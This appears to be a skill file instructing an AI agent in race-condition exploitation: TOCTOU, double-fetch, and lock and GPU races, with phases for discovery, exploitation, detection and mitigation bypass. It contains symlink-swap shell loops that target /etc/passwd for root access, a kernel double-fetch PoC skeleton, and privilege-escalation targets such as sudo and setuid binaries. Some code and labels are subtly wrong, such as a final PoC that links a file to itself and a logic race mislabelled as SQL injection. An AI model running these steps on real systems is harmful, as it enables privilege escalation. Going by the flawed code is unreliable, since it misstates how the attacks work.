---
name: Race Condition
description: Race condition exploitation — TOCTOU, double-fetch, thread safety
tags: [race, toctou, concurrency, thread, exploit]
---
Task: Race Condition Exploitation. Detect and exploit race conditions and TOCTOU vulnerabilities.

## Approach

Race conditions occur when: check → use time gap exists. Exploit by winning the race to corrupt state.

## Phase 1: Vulnerability Discovery

**TOCTOU (Time-of-Check-Time-of-Use)**
```
Classic Pattern:
1. Thread A: Check permissions (stat, access)
2. Thread B: Swap file (symlink, rename)
3. Thread A: Use file (open, execute)
4. Result: Wrong file accessed

Code Examples:
- access(path, W_OK) → open(path, O_WRONLY)
- stat(file) → fopen(file)
- Check permissions → execute

Targets:
- File operations
- IPC operations
- Permission checks
- Resource validation
```

**Double-Fetch**
```
Pattern: Kernel/userspace boundary

Kernel:
1. Fetch data from userspace (copy_from_user)
2. Validate data
3. Fetch same data again (race!)
4. Use corrupted data

Example:
if (copy_from_user(&size, user_ptr, 8)) return -EFAULT;
if (size > MAX_SIZE) return -EINVAL;
if (copy_from_user(&size, user_ptr, 8)) return -EFAULT; // Race!
kernel_buffer[size] = data; // Overflow
```

**Thread Safety Issues**
```
Patterns:
1. Non-atomic check-and-act
2. Shared state without locks
3. Lock ordering issues
4. Deadlock conditions

Code:
if (global_ptr == NULL) {  // ← Check
    global_ptr = malloc(100); // ← Act (race!)
}
```

**Signal Handler Race**
```
Pattern:
1. Signal handler interrupts code
2. Modifies shared state
3. Original code continues
4. Inconsistent state

Example:
volatile int signal = 0;
void handler() { signal = 1; }
void func() {
    signal = 0;
    // ← Signal fires here
    if (signal) { /* never reached */ }
}
```

## Phase 2: Race Window Analysis

**Identify Race Window**
```
Code Analysis:
1. Find check → use pattern
2. Measure time gap
3. Identify controllable operations
4. Determine win conditions

Dynamic Analysis:
1. Instrument code with timestamps
2. Measure actual race windows
3. Test with different loads
4. Find optimal timing
```

**Race Conditions for Exploitation**
```
File Race (Symlink):
1. Attacker creates: /tmp/safefile
2. App checks: /tmp/safefile (safe)
3. Attacker swaps: /tmp/safefile → /etc/passwd
4. App opens: /etc/passwd (thinking it's safefile)
5. Result: Write to privileged file

Privilege Escalation:
1. Check: user has permission
2. Race: Elevate privileges
3. Use: Operate with elevated permissions
4. Result: Privilege escalation
```

## Phase 3: Exploitation Techniques

**File System TOCTOU**
```
Symlink Attack:
1. Create safe file: /tmp/file
2. Replace with symlink: ln -s /etc/passwd /tmp/file
3. Application opens: /tmp/file (actually /etc/passwd)
4. Result: Write to privileged file

Hardlink Attack:
1. Create hardlink to privileged file
2. Link from accessible location
3. Modify through link
4. Changes affect privileged file

Directory Traversal:
1. Check: /tmp/safe/file
2. Race: Rename /tmp/safe → /tmp/evil
3. Create: /tmp/safe/file
4. Use: Opens /tmp/evil/file
```

**Kernel Double-Fetch**
```
Technique:
1. Kernel fetches pointer from userspace
2. Validates pointer (NULL check, bounds)
3. Kernel fetches pointer again (race window)
4. Attacker changes pointer between fetches
5. Kernel uses corrupted pointer

Exploit:
- Thread 1: Trigger kernel operation
- Thread 2: Race to change pointer
- Win race: Kernel reads corrupted value
- Result: Kernel memory corruption, privilege escalation

Targets:
- Ioctl handlers
- Syscall implementations
- File system operations
- Device drivers
```

**Memory Allocation Race**
```
Use-After-Free Race:
1. Thread A: malloc(obj) → use(obj) → free(obj)
2. Thread B: Race to realloc(obj) during use
3. Win race: Thread A uses freed object
4. Result: Use-after-free vulnerability

Heap Spray Race:
1. Thread A: Free object
2. Thread B: Race to spray heap
3. Win race: Object overlapped with controlled data
4. Result: Controlled memory corruption
```

**Lock Ordering Race**
```
Deadlock Exploitation:
1. Thread A: Lock(Lock1) → ... → Lock(Lock2)
2. Thread B: Lock(Lock2) → ... → Lock(Lock1)
3. Result: Deadlock (DoS)

Priority Inversion:
1. Low-priority thread holds lock
2. High-priority thread waits
3. Medium-priority thread preempts
4. Result: Priority inversion, DoS
```

## Phase 4: Advanced Techniques

**Speculative Execution Races**
```
Spectre-style Exploits:
1. Branch prediction training
2. Speculative execution bypass
3. Cache timing side channel
4. Read kernel memory from userspace

Meltdown-style:
1. Speculative exception handling
2. Read protected memory
3. Cache side channel leak
4. Bypass kernel boundary
```

**GPU Race Conditions**
```
Shared Memory Races:
1. CPU/GPU shared memory
2. Asynchronous operations
3. Race on command completion
4. Memory corruption

Exploitation:
- Race GPU command submission
- Corrupt GPU memory
- Escape GPU sandbox
- Code execution
```

**Database Race Conditions**
```
SQL Injection Race:
1. Check: SELECT * FROM users WHERE id = ?
2. Race: UPDATE users SET admin = 1
3. Use: Application trusts unchecked data
4. Result: Privilege escalation

Transaction Race:
1. Read balance: $100
2. Race: Withdraw $100 twice
3. Result: Negative balance, money lost
```

## Phase 5: Race Condition Detection

**Static Analysis**
```
Code Patterns:
- Non-atomic check-and-act
- Shared state without locks
- Double-fetch patterns
- Signal handler usage

Tools:
- ThreadSanitizer (TSan)
- Race detection tools
- Static analyzers
- Code review
```

**Dynamic Analysis**
```
Runtime Detection:
- ThreadSanitizer (GCC, Clang)
- Helgrind (Valgrind)
- DRD (Valgrind)
- Intel Inspector

Detection:
- Data races on memory
- Lock order violations
- Deadlock detection
- Thread safety issues
```

**Fuzzing**
```
Race Fuzzing:
1. Multi-threaded fuzzing
2. Concurrent operations
3. Random timing delays
4. Race window exploration

Tools:
- Race condition fuzzer
- Concurrency fuzzer
- Custom harness
```

## Phase 6: Exploit Development

**File System Exploit**
```
Target: Setuid application
1. Application checks: /tmp/file (safe)
2. Attacker races: Replace /tmp/file with symlink
3. Application opens: /tmp/file (actually /etc/passwd)
4. Result: Write to /etc/passwd, root access

Code:
ln -fs /etc/passwd /tmp/file
while true; do
    ln -fs /tmp/target /tmp/file
    ./vuln_app &
    ln -fs /etc/passwd /tmp/file
done
```

**Kernel Double-Fetch Exploit**
```
Target: Vulnerable ioctl
1. Thread 1: Trigger ioctl with safe pointer
2. Thread 2: Race to change pointer
3. Win race: Kernel fetches corrupted pointer
4. Result: Kernel memory corruption

POC:
pthread_t thread1, thread2;
void *race_thread(void *arg) {
    while (1) {
        *user_ptr = safe_ptr;
        usleep(1);
        *user_ptr = evil_ptr;
    }
}
pthread_create(&thread1, NULL, race_thread, NULL);
pthread_create(&thread2, NULL, ioctl_trigger, NULL);
```

**Privilege Escalation Race**
```
Technique:
1. Application checks: User permission
2. Attacker races: Elevate privileges
3. Application uses: Elevated privileges
4. Result: Privilege escalation

Targets:
- sudo operations
- setuid applications
- Daemon operations
- Service managers
```

## Phase 7: Mitigation Bypass

**Mitigation Strategies**
```
Developers:
1. Atomic operations
2. Proper locking
3. Revalidate after use
4. Use file descriptors instead of paths

Attackers:
1. Widen race window
2. Increase thread priority
3. Optimize timing
4. Use speculative execution
```

**Bypass Techniques**
```
1. CPU pinning: Control thread scheduling
2. Real-time priority: Higher scheduling priority
3. Cache optimization: Faster execution
4. Speculative execution: Bypass checks
```

## Final Report

```
[VULNERABILITY] TOCTOU in file access
Type: Race Condition (TOCTOU)
Severity: HIGH (privilege escalation)
Race Window: ~2ms

[Bug Details]
Location: file_open + 0x42
Check: access(path, F_OK)
Use: fopen(path, "w")
Gap: 2ms (measured)

[Exploitation]
1. Create safe file: /tmp/safe
2. Application checks: /tmp/safe (exists)
3. Race: ln -fs /etc/passwd /tmp/safe
4. Application opens: /etc/passwd (thinking it's /tmp/safe)
5. Write: Add root user to /etc/passwd
6. Result: Root access

[POC]
#!/bin/bash
while true; do
    ln -fs /etc/passwd /tmp/safe
    ./vuln_app --file /tmp/safe &
    ln -fs /tmp/safe /tmp/safe
done

Win rate: ~80% (2000 attempts)
Mitigations: Use openat2, O_NOFOLLOW
